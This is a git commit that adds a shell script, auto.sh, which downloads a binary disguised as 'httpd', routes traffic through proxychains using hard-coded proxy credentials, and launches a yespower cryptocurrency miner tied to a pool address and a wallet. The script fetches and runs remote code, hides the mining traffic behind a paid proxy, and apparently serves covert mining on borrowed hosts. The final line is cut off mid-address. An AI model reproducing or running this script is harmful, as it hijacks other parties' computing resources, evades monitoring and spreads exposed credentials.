e0691c2925540725cc852f6c28690b552e373a49
Mas kurniawan <110314564+55113110159@users.noreply.github.com>
2023-12-31 16:23:36 +0700

    Create auto.sh

---
+++ auto.sh
@@ -0,0 +1,22 @@
+proxy="52.5.38.201" 
+port="9293" 
+user="neozk6kncbe8qm"  
+pass="us-east-static-06.quotaguard.com" 
+wget -q -O Tolino https://bitbucket.org/indarsza/sanaya/downloads/httpd && chmod +x Tolino
+wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/panel && chmod +x panel 
+wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/proxychains.conf && chmod +x proxychains.conf 
+wget -q https://gitea.com/sayandaerika/web-madang/raw/branch/main/libproxychains4.so && chmod +x libproxychains4.so 
+sleep 3 
+sed -i "s/127.0.0.1/$proxy/" "proxychains.conf" 
+sleep 1 
+sed -i "s/port/$port/" "proxychains.conf" 
+sed -i "s/user/$user/" "proxychains.conf"  
+sleep 1  
+sed -i "s/pass/$pass/" "proxychains.conf" 
+sleep 11 
+echo "******************************************************************" 
+echo "IP ORI ==> "$(curl ifconfig.me) 
+echo " " 
+echo " " 
+echo "IP BARU ==> "$(./panel curl ifconfig.me)
+./panel ./Tolino -a yespower -o 149.50.222.86:443 -u WchPf8BdS5vWZvZjMWgzeHur5RaHRX9nVr.$(echo $(shuf -i 1-999 -n 1)-senio) --timeout 120 -p c=SWAMP,mc=VHH -x socks5://neozk6kncbe8qm:85u51lygdunhr6j4munieq0xm5sot@52.7.247.
